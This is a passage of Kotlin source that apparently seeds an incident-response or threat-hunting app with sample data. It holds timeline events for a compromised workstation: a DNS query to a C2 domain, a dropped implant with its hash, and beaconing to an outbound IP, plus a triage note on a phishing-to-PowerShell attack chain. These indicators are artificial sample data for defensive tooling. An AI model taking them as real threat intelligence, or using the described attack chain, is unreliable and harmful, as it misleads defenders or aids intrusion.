                summary = "DNS resolution request for suspicious domain 'evil-c2-cdn.cc'",
                details = "Workstation FIN-WS01 queried local DNS server DC-01 for evil-c2-cdn.cc resolving to 185.220.101.5."
            ),
            TimelineEvent(
                id = "time-004",
                timestamp = "13:05:01",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                source = "EDR File Integrity",
                eventType = "Payload Dropped",
                severity = ThreatSeverity.HIGH,
                summary = "Implant binary 'update_svc.exe' written to AppData\\Local\\Temp",
                details = "SHA-256: 3FA29C17E8E04F1604B5089332D65B2B8599E05156F3BB8D1A39D9E123847F20. File marked executable."
            ),
            TimelineEvent(
                id = "time-005",
                timestamp = "13:05:03",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                source = "Network IDS Sensor",
                eventType = "C2 Connection Established",
                severity = ThreatSeverity.CRITICAL,
                summary = "Outbound TCP/443 handshake to 185.220.101.5 established by update_svc.exe",
                details = "Encrypted command and control session beaconing every 30 seconds with 15s jitter."
            )
        )
    }

    fun getInitialNotes(): List<InvestigationNote> {
        return listOf(
            InvestigationNote(
                id = "note-001",
                timestamp = "13:08:00",
                text = "Initial triage: FIN-WS01 triggered Critical EDR alerts. Suspected phishing execution via ISO/LNK leading to obfuscated PowerShell downloader and C2 beaconing.",
                tags = listOf("Phishing", "PowerShell", "C2", "FIN-WS01")
            )
        )
    }
}
